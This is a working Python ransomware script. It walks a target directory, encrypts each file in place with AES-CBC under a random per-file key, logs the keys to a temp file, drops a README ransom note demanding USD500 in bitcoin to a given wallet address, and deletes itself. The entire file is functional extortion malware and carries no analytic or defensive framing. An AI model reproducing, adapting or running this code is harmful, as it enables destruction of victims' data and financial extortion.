import json
import os
import logging
import hashlib
import time
import sys
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

deleteLog = False
encrypt_dir = ""
USAGE = "python {} <FILE_DIR>"

if len(sys.argv) <= 1:
    print(USAGE.format(sys.argv[0]))
    sys.exit(1)
else:
    encrypt_dir = sys.argv[1]
    if not os.path.isdir(encrypt_dir):
        print("Directory does not exist!")
        sys.exit(1)

ransomware_message = '''Your important files are encrypted. 
Many of your documents, photos, videos, databases and other files are no longer accessible because they have been encrypted. There is no way to recover your files except with our decryption service.
You can recover your files simply by paying USD500 worth of bitcoin to the address below.
Once we verify the transaction, we will send you the decryption key.
If we don't receive any payments in 7 days, you won't be able to recover your files forever.
Bitcoin wallet address: bc1q0u6ahejgnfll57m3v5n2fd5wqx0pzu8sp5l67k'''

tmp_dir = os.environ["temp"]
debug_file = os.path.join(tmp_dir, "encrypt.log")

logging.basicConfig(filename=debug_file, filemode='w', format='%(levelname)s: %(message)s', level=logging.INFO)

for subdir, dirs, files in os.walk(encrypt_dir):
    for filename in files:
        key = get_random_bytes(32)
        cipher = AES.new(key, AES.MODE_CBC)
        hash = hashlib.sha1()
        with open(os.path.join(subdir, filename), "rb+") as f:
            data = f.read()
            hash.update(data)
            ct_bytes = cipher.encrypt(pad(data, AES.block_size))
            f.seek(0)
            f.write(ct_bytes)
            f.truncate()
            metadata = { 
                'filename': os.path.join(subdir, filename),
                'iv':b64encode(cipher.iv).decode(), 
                'key': b64encode(key).decode(),
                'hash': hash.hexdigest()
            }
        logging.info("encrypting file: {}".format(json.dumps(metadata)))

logging.shutdown()

#write ransomware text to the user
readme_file = os.path.join(encrypt_dir, "README.md")

with open(readme_file, "w") as f:
    f.write(ransomware_message)

if deleteLog:
    os.remove(debug_file)

os.remove(sys.argv[0])

while True:
    time.sleep(600)
